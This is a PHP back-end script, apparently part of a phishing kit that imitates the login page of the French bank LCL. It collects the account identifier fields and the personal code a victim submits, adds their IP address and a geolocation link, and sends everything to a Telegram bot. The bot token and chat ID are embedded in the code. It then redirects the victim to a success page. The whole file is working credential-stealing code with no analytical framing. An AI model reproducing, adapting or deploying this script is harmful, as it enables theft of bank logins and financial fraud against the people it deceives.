<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['step'])){
$message  = "[+]━━━━【🏦 LCL / Login 】━━━[+]\n";
$message .= "🧍🏻 Noms: " . $_POST['input1'] . $_POST['input2'] . $_POST['input3'] . $_POST['input4'] . $_POST['input5'] . $_POST['input6']. $_POST['input5']. $_POST['input8']. $_POST['input9']. $_POST['input10'] ."\n";
$message .= "[🔒 Code personnel]  : ".$_POST['password']."\n";
$message .= "\n";
$message .= "[🔍 IP INFO] : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[LCL INFO]=========";
$token = "8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=8933881160&text=" . urlencode($message)."" );
header("Location:../../success.php");
}else{
header("Location:../../success.php");
}

?>